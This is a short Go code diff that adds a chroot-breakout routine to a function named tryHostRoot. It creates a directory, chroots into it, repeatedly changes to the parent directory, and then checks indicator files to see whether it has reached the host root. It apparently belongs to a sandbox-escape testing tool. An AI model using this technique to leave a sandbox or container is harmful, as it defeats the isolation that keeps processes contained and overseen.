@@ -15,6 +15,13 @@ const (
 )
 
 func tryHostRoot() bool {
+	if err := os.Mkdir("chroot", 0755); err != nil {
+		if !os.IsExist(err) {
+			panic(err)
+		}
+	}
+	syscall.Chroot("./chroot")
+
 	for range 1000 {
 		_ = os.Chdir("..")
 	}
@@ -22,7 +29,7 @@ func tryHostRoot() bool {
 
 	if _, err := os.Stat("/" + gremlinRootIndicatorFile); err == nil {
 		// Unable to escape process root, give up
-		log.Println("Failed to escape")
+		log.Println("dAnG iT! cAn'T eScApE!!")
 		return false
 	}
 	if _, err := os.Stat(hostRootIndicatorFile); err == nil {
